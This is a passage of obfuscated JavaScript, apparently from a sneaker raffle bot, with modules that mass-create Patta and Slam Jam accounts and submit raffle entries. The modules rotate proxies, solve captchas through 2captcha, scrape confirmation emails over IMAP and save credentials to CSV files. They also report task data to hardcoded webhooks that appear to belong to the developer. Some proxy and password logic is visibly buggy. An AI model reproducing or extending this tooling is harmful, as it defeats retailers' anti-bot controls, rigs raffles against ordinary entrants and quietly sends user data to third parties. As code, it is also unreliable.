                        var _0x39681e = new _0x5deaaa({
                            'user': _0x196f8e['masterMail'],
                            'password': _0x196f8e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3d00e0(_0x35cd88) {
                            _0x39681e['openBox']('INBOX', ![], _0x35cd88);
                        }
                        _0x39681e['once']('ready', function () {
                            _0x3d00e0(function (_0x1d0dbc, _0x1a4494) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1d0dbc)
                                    throw _0x1d0dbc;
                                _0x39681e['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x3ae400, _0x42c95e) {
                                    if (!_0x42c95e || !_0x42c95e['length'])
                                        console['log'](_0x508dba() + '\x20[' + _0x2091f1['name'] + ']\x20No\x20mails\x20found'), _0x39681e['end']();
                                    else {
                                        var _0x7c1a44 = _0x39681e['seq']['fetch'](_0x42c95e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x7c1a44['on']('message', function (_0x1e24b9, _0x4a547d) {
                                            var _0x382a57 = '(#' + _0x4a547d + ')\x20';
                                            _0x1e24b9['on']('body', function (_0x293aa9, _0xa9289e) {
                                                _0x45f099(_0x293aa9, (_0x29a7af, _0x36636b) => {
                                                    var _0x476954 = _0x36636b['text']['split']('(')[0x1], _0x2d94b1 = _0x476954['split'](')')[0x0];
                                                    _0x10e277['push'](_0x2d94b1);
                                                });
                                            }), _0x1e24b9['once']('end', function () {
                                            });
                                        }), _0x7c1a44['once']('error', function (_0x325b32) {
                                            console['log']('Fetch\x20error:\x20' + _0x325b32), _0x55894b = !![];
                                        }), _0x7c1a44['once']('end', function () {
                                            _0x39681e['end'](), _0x55894b = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x39681e['once']('error', function (_0x3aa0f8) {
                            console['log'](_0x3aa0f8), _0x55894b = !![];
                        }), _0x39681e['once']('end', async function () {
                            _0x55894b = !![];
                        }), _0x39681e['connect']();
                    }
                    async function _0x20e4cf(_0xd32e12, _0x29adff, _0xb7985b) {
                        for (var _0x2b4136 = 0x0; _0x2b4136 < _0x29adff['length']; _0x2b4136++) {
                            async function _0x11370d(_0x13384f, _0x529353, _0x9726ca, _0x4764c2, _0x2bf6a9) {
                                var _0xd9244a, _0x4720b5 = {}, _0x51c9ad = [], _0x558c1f = {}, _0x5185ac = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x32aeb5 = Math['round'](Math['random']() * (_0x5185ac['length'] - 0x1));
                                _0x4764c2[_0x13384f]['Size'] == 'RANDOM' && (_0x4764c2[_0x13384f]['Size'] = _0x5185ac[_0x32aeb5]);
                                !_0x4764c2 && (_0x4764c2 = {});
                                if (_0x196f8e['useRandomProxy'] = ![])
                                    var _0x3c7956 = _0x2bf6a9[_0x13384f]['split'](':');
                                else
                                    var _0x2ac99a = Math['round'](Math['random']() * (_0x2bf6a9['length'] - 0x1)), _0x3c7956 = _0x2bf6a9[_0x2ac99a]['split'](':');
                                var _0x50a25a = {
                                    'jar': _0x3b7fa9,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x9726ca['url'],
                                    'headers': _0x9726ca['headers'],
                                    'body': JSON['stringify'](_0x4720b5),
                                    'proxy': 'http://' + _0x3c7956[0x2] + ':' + _0x3c7956[0x3] + '@' + _0x3c7956[0x0] + ':' + _0x3c7956[0x1]
                                };
                                return _0x529353 != 'ver' && (_0x50a25a['url'] = _0x9726ca['url'], _0x50a25a['headers'] = _0x9726ca['headers']), _0x529353 == 'ver' && (_0x50a25a['method'] = 'GET', _0x50a25a['url'] = _0x4764c2[_0x13384f]), new Promise(function (_0x156e84, _0x54ab76) {
                                    callback = async (_0xc0fbe9, _0x4e5adc, _0x2db29b) => {
                                        if (!_0xc0fbe9 && _0x4e5adc['statusCode'] == 0xca || !_0xc0fbe9 && _0x4e5adc['statusCode'] == 0xc8) {
                                            if (_0x529353 != 'ver') {
                                                var _0x4f9e13 = await _0x107feb(_0x4764c2[_0x13384f], _0x9726ca, 'dev', ![]), _0x5353b4 = await _0x107feb(_0x4764c2[_0x13384f], _0x9726ca, 'pub', ![]);
                                                const _0x51fca5 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4f9e13] },
                                                    'succesPUBMSG': { 'embeds': [_0x5353b4] }
                                                };
                                                if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                                                    try {
                                                        await _0x459a7f(_0x196f8e['webhook'], _0x51fca5['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x51fca5['succesDEVMSG']), await _0x54262e(0xc8);
                                                try {
                                                    await _0x459a7f(_0xf106b7, _0x51fca5['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3444cf(_0x4764c2[_0x13384f], _0x9726ca);
                                            }
                                            _0x156e84(console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x9726ca['name'] + ']\x20Task\x20' + (_0x13384f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x529353 != 'ver') {
                                                var _0x406e54 = '' + _0xc0fbe9, _0x1164e6 = await _0x107feb(_0x4764c2[_0x13384f], _0x9726ca, 'dev', !![], _0x406e54), _0x478254 = {};
                                                _0x478254['errorDEV'] = { 'embeds': [_0x1164e6] }, _0x29ff38(_0x4764c2[_0x13384f], _0x9726ca), _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x478254['errorDEV']), await _0x459a7f(_0x491127, _0x478254['errorDEV']);
                                            }
                                            _0x54ab76(console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x9726ca['name'] + ']\x20Task\x20' + (_0x13384f + 0x1) + ':\x20' + _0xc0fbe9)));
                                        }
                                    };
                                    try {
                                        _0x529353 != 'ver' ? console['log'](_0x508dba() + '\x20[' + _0x9726ca['name'] + ']\x20Task\x20' + (_0x13384f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4720b5['data']['attributes']['email']) : console['log'](_0x508dba() + '\x20[' + _0x9726ca['name'] + ']\x20Task\x20' + (_0x13384f + 0x1) + ':\x20Fetching\x20Response'), _0x2ed36a(_0x50a25a, callback);
                                    } catch (_0xf87994) {
                                        console['log'](_0x508dba() + '\x20Task\x20' + (_0x13384f + 0x1) + ':\x20' + _0xf87994);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x11370d(_0x2b4136, 'ver', _0xd32e12, _0x29adff, _0xb7985b), console['log'](_0x508dba() + '\x20[' + _0xd32e12['name'] + ']\x20Sleeping\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                            } catch (_0x1027b5) {
                            }
                        }
                    }
                    try {
                        _0x16ed31();
                        while (!_0x55894b) {
                            await _0x54262e(0xfa0);
                        }
                        console['log']('Found\x20' + _0x10e277['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x20e4cf(_0x2091f1, _0x10e277, _0x3ffebe);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x238df3, _0x32ab2f, _0x5b3b99) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1f909f = 0x0; _0x1f909f < _0x32ab2f['length']; _0x1f909f++) {
                        var _0x22d062 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2ccb52
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x196f8e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5c71b0
                                }
                            ]
                        }];
                        const _0xaddd27 = { 'embeds': _0x22d062 };
                        _0x3feae7(_0x238df3['name'] + '\x20Task\x20' + (_0x1f909f + 0x1) + '\x20/\x20' + _0x32ab2f['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x32ab2f, _0x1f909f);
                        var _0x96da9d = await _0x107feb(_0x32ab2f[_0x1f909f], _0x238df3, 'acc', ![]);
                        const _0x55e82a = { 'succesDEVMSG': { 'embeds': [_0x96da9d] } };
                        if (_0x32ab2f[_0x1f909f]['Email'] == '' || _0x32ab2f[_0x1f909f]['FirstName'] == '' || _0x32ab2f[_0x1f909f]['LastName'] == '') {
                            console['log'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x54262e(0x7d0);
                            continue;
                        }
                        (_0x32ab2f[_0x1f909f]['Password'] == '' || _0x32ab2f[_0x1f909f] == undefined) && _0x32ab2f[_0x1f909f]['Password'] == 'JRaffles23!';
                        if (_0x196f8e['useRandomProxy'] = ![])
                            var _0x4e3170 = _0x5b3b99[_0x1f909f]['split'](':');
                        else
                            var _0x25cd85 = Math['round'](Math['random']() * (_0x5b3b99['length'] - 0x1)), _0x4e3170 = _0x5b3b99[_0x25cd85]['split'](':');
                        const _0x4b61cf = await _0x3dd4ff['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4e3170[0x0] + ':' + _0x4e3170[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1cd32b = await _0x4b61cf['newPage']();
                            await _0x1cd32b['authenticate']({
                                'username': '' + _0x4e3170[0x2],
                                'password': '' + _0x4e3170[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x238df3['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1cd32b['setRequestInterception'](!![]), _0x1cd32b['on']('request', _0x2d1bb9 => {
                                _0x2d1bb9['resourceType']() === 'image' || _0x2d1bb9['resourceType']() === 'font' || _0x2d1bb9['resourceType']() === 'media' ? _0x2d1bb9['abort']() : _0x2d1bb9['continue']();
                            }), await _0x1cd32b['goto']('https://patta.nl/account/register'), await _0x54262e(0xbb8), await _0x1cd32b['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x508dba() + '\x20[' + _0x238df3['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20Filling\x20information'), await _0x1cd32b['type']('#RegisterForm-FirstName', '' + _0x32ab2f[_0x1f909f]['FirstName']), await _0x54262e(0x226), await _0x1cd32b['type']('#RegisterForm-LastName', '' + _0x32ab2f[_0x1f909f]['LastName']), await _0x54262e(0x226), await _0x1cd32b['type']('#RegisterForm-email', '' + _0x32ab2f[_0x1f909f]['Email']), await _0x54262e(0x226), await _0x1cd32b['type']('#RegisterForm-password', '' + _0x32ab2f[_0x1f909f]['Password']), await _0x54262e(0x226), console['log'](_0x508dba() + '\x20[' + _0x238df3['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20Submitting..'), await _0x1cd32b['$eval']('#RegisterForm', _0x11da64 => _0x11da64['submit']()), await _0x54262e(0x1f40);
                            try {
                                await _0x1cd32b['waitForSelector']('.home-page-grid__collection'), await _0x54262e(0x1f4), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x238df3['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20Account\x20' + _0x32ab2f[_0x1f909f]['Email'] + '\x20Generated!')), _0x3a2baa['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x32ab2f[_0x1f909f]['Email'] + ',' + _0x32ab2f[_0x1f909f]['Password']), console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x238df3['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20Account\x20' + _0x32ab2f[_0x1f909f]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x55e82a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x459a7f(_0x1796bc, _0x55e82a['succesDEVMSG']);
                            } catch (_0x11ed66) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x11ed66));
                            }
                        } catch (_0x549bd9) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x1f909f + 0x1) + '\x20:\x20' + _0x549bd9));
                        } finally {
                            _0x4b61cf && _0x4b61cf['close'](), console['log']('Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x218ad8, _0x3b8c27, _0x25a3b8) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1791bb = 0x0; _0x1791bb < _0x3b8c27['length']; _0x1791bb++) {
                        var _0x58cfc4;
                        if (_0x2a1415 != 'yes')
                            var _0x2a1415 = '', _0x4c3699 = 0x0;
                        _0x3feae7(_0x218ad8['name'] + '\x20Task\x20' + (_0x1791bb + 0x1) + '\x20/\x20' + _0x3b8c27['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x3b8c27, _0x1791bb);
                        if (_0x3b8c27[_0x1791bb]['Email'] == '' || _0x3b8c27[_0x1791bb]['Password'] == '' || _0x3b8c27[_0x1791bb]['FirstName'] == '' || _0x3b8c27[_0x1791bb]['LastName'] == '') {
                            console['log'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x196f8e['useRandomProxy'] = ![])
                            var _0x1cea19 = _0x25a3b8[_0x1791bb]['split'](':');
                        else
                            var _0x218846 = Math['round'](Math['random']() * (_0x25a3b8['length'] - 0x1)), _0x1cea19 = _0x25a3b8[_0x218846]['split'](':');
                        const _0x1a57ec = await _0x3dd4ff['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x1cea19[0x0] + ':' + _0x1cea19[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x3712b1 = await _0x1a57ec['newPage']();
                            await _0x3712b1['authenticate']({
                                'username': '' + _0x1cea19[0x2],
                                'password': '' + _0x1cea19[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3712b1['setRequestInterception'](!![]), _0x3712b1['on']('request', _0xd79db9 => {
                                _0xd79db9['resourceType']() === 'image' || _0xd79db9['resourceType']() === 'font' || _0xd79db9['resourceType']() === 'media' ? _0xd79db9['abort']() : _0xd79db9['continue']();
                            }), await _0x3712b1['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3712b1['waitForSelector']('#CustomerEmail'), console['log'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3712b1['type']('#CustomerEmail', '' + _0x3b8c27[_0x1791bb]['Email']), await _0x54262e(0x12c), await _0x3712b1['type']('#CustomerPassword', '' + _0x3b8c27[_0x1791bb]['Password']), await _0x54262e(0x226), await _0x3712b1['$eval']('#customer_login', _0x302e0a => _0x302e0a['submit']());
                            try {
                                await _0x3712b1['waitForSelector']('#orders'), await _0x54262e(0x4b0);
                            } catch {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3712b1['goto']('' + _0x3b8c27[_0x1791bb]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x54262e(0xbb8), console['log'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3712b1['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x3712b1['type']('#email', '' + _0x3b8c27[_0x1791bb]['Email']), await _0x54262e(0x384), await _0x3712b1['type']('#first_name', '' + _0x3b8c27[_0x1791bb]['FirstName']), await _0x54262e(0x514), await _0x3712b1['type']('#last_name', '' + _0x3b8c27[_0x1791bb]['LastName']), await _0x54262e(0x514), await _0x3712b1['type']('#street_address', _0x3b8c27[_0x1791bb]['Address1'] + '\x20' + _0x3b8c27[_0x1791bb]['HouseNumber'] + '\x20' + _0x3b8c27[_0x1791bb]['Address2']), await _0x54262e(0x2bc);
                            _0x3b8c27[_0x1791bb]['Postcode'] == undefined && (_0x3b8c27[_0x1791bb]['Postcode'] = _0x3b8c27[_0x1791bb]['Zip']);
                            await _0x3712b1['type']('#zip_code', '' + _0x3b8c27[_0x1791bb]['Postcode']), await _0x54262e(0x320), await _0x3712b1['type']('#city', '' + _0x3b8c27[_0x1791bb]['City']), await _0x54262e(0x320), await _0x3712b1['type']('#bday', '01/01/1994'), await _0x54262e(0x320), await _0x3712b1['type']('#instagram', '' + _0x3b8c27[_0x1791bb]['Follower']), await _0x54262e(0x352);
                            if (_0x3b8c27[_0x1791bb]['Size'] == 'RANDOM') {
                                const _0x2fe310 = await _0x3712b1['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2d8934 => {
                                    return _0x2d8934['map'](_0x2ef439 => _0x2ef439['textContent']);
                                });
                                var _0x207065 = Math['round'](Math['random']() * (_0x2fe310['length'] - 0x1));
                                console['log'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2fe310[_0x207065]), await _0x3712b1['click']('label[data-eu-size=\x22' + _0x2fe310[_0x207065] + '\x22]');
                            } else {
                                console['log'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x3b8c27[_0x1791bb]['Size']);
                                try {
                                    await _0x3712b1['click']('label[data-eu-size=\x22' + _0x3b8c27[_0x1791bb]['Size'] + '\x22]');
                                } catch {
                                    await _0x3712b1['click']('label[data-eu-size=\x22' + _0x3b8c27[_0x1791bb]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x54262e(0xbb8), await _0x3712b1['$$eval']('.raffle__checkbox-label', _0x22af44 => _0x22af44['forEach'](_0x42563e => _0x42563e['click']())), await _0x54262e(0x7d0), console['log'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x3712b1['click']('#raffle__form-submit'), await _0x54262e(0x1388);
                            try {
                                await _0x3712b1['waitForSelector']('#raffle__confirmation-message-container'), _0x2a1415 = 'no', _0x3444cf(_0x3b8c27[_0x1791bb], _0x218ad8), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1fe6d9) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1fe6d9));
                            }
                        } catch (_0x4d1d85) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20' + _0x4d1d85)), _0x2a1415 = 'yes';
                        } finally {
                            _0x1a57ec && _0x1a57ec['close']();
                            if (_0x2a1415 == 'yes' && _0x4c3699 != 0x5 && _0x58cfc4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x218ad8['name'] + ']\x20Task\x20' + (_0x1791bb + 0x1) + '\x20:\x20Retrying')), _0x1791bb = _0x1791bb - 0x1, _0x4c3699 = _0x4c3699 + 0x1;
                                continue;
                            }
                            _0x2a1415 == 'yes' && _0x4c3699 >= 0x5 && (_0x29ff38(_0x3b8c27[_0x1791bb], _0x218ad8), _0x2a1415 = 'no', _0x4c3699 = 0x0), console['log']('Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x8ce722, _0x27769b, _0x534edf) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3822c3 = 0x0; _0x3822c3 < _0x27769b['length']; _0x3822c3++) {
                        if (_0x22ecfb != 'yes')
                            var _0x22ecfb = '', _0x11f165 = 0x0;
                        var _0x1fd548 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2ccb52
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x196f8e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5c71b0
                                }
                            ]
                        }];
                        const _0x108b8e = { 'embeds': _0x1fd548 };
                        _0x3feae7(_0x8ce722['name'] + '\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20/\x20' + _0x27769b['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x27769b, _0x3822c3);
                        var _0x2541ee = await _0x107feb(_0x27769b[_0x3822c3], _0x8ce722, 'acc', ![]);
                        const _0x5518c5 = { 'succesDEVMSG': { 'embeds': [_0x2541ee] } };
                        if (_0x27769b[_0x3822c3]['Email'] == '' || _0x27769b[_0x3822c3]['FirstName'] == '' || _0x27769b[_0x3822c3]['LastName'] == '') {
                            console['log'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x54262e(0x7d0);
                            continue;
                        }
                        (_0x27769b[_0x3822c3]['Password'] == '' || _0x27769b[_0x3822c3] == undefined) && _0x27769b[_0x3822c3]['Password'] == 'JRaffles23!';
                        if (_0x196f8e['useRandomProxy'] = ![])
                            var _0x45feef = _0x534edf[_0x3822c3]['split'](':');
                        else
                            var _0xa0f06a = Math['round'](Math['random']() * (_0x534edf['length'] - 0x1)), _0x45feef = _0x534edf[_0xa0f06a]['split'](':');
                        const _0x211bf1 = await _0x3dd4ff['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x45feef[0x0] + ':' + _0x45feef[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x21aa3d = await _0x211bf1['newPage']();
                            await _0x21aa3d['authenticate']({
                                'username': '' + _0x45feef[0x2],
                                'password': '' + _0x45feef[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x21aa3d['setRequestInterception'](!![]), _0x21aa3d['on']('request', _0x5d1192 => {
                                _0x5d1192['resourceType']() === 'image' || _0x5d1192['resourceType']() === 'font' || _0x5d1192['resourceType']() === 'media' ? _0x5d1192['abort']() : _0x5d1192['continue']();
                            }), await _0x21aa3d['goto']('https://drop.slamjam.com/account/register'), await _0x54262e(0xbb8), await _0x21aa3d['waitForSelector']('#FirstName'), await _0x21aa3d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x21aa3d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Filling\x20information'), await _0x54262e(0x4b0), await _0x21aa3d['type']('#FirstName', '' + _0x27769b[_0x3822c3]['FirstName']), await _0x54262e(0x226), await _0x21aa3d['type']('#LastName', '' + _0x27769b[_0x3822c3]['LastName']), await _0x54262e(0x226), await _0x21aa3d['type']('#Email', '' + _0x27769b[_0x3822c3]['Email']), await _0x54262e(0x2ee), await _0x21aa3d['type']('#ConfirmEmail', '' + _0x27769b[_0x3822c3]['Email']), await _0x54262e(0x2ee), await _0x21aa3d['type']('#CreatePassword', '' + _0x27769b[_0x3822c3]['Password']), await _0x54262e(0x2ee), await _0x21aa3d['type']('#CreateConfirmPassword', '' + _0x27769b[_0x3822c3]['Password']), await _0x54262e(0x226), console['log'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Submitting..'), await _0x21aa3d['$eval']('#create_customer', _0x4e744a => _0x4e744a['submit']()), await _0x54262e(0x1388), console['log'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20' + _0x351e10['cyan']('Solving\x20Captcha')), await _0x21aa3d['solveRecaptchas'](), console['log'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x21aa3d['$eval']('.shopify-challenge__container\x20>\x20form', _0x4a2fe4 => _0x4a2fe4['submit']());
                            try {
                                await _0x21aa3d['waitForSelector']('.product-card__image'), await _0x54262e(0x1f4), _0x22ecfb = 'no', console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Account\x20' + _0x27769b[_0x3822c3]['Email'] + '\x20Generated!')), _0x3a2baa['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x27769b[_0x3822c3]['Email'] + ',' + _0x27769b[_0x3822c3]['Password']), console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Account\x20' + _0x27769b[_0x3822c3]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x5518c5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x459a7f(_0x1796bc, _0x5518c5['succesDEVMSG']);
                            } catch (_0x4bc3e2) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4bc3e2));
                            }
                        } catch (_0x55443e) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20' + _0x55443e));
                        } finally {
                            _0x211bf1 && _0x211bf1['close']();
                            if (_0x22ecfb == 'yes' && _0x11f165 != 0x5) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x8ce722['name'] + ']\x20Task\x20' + (_0x3822c3 + 0x1) + '\x20:\x20Retrying')), _0x3822c3 = _0x3822c3 - 0x1, _0x11f165 = _0x11f165 + 0x1;
                                continue;
                            }
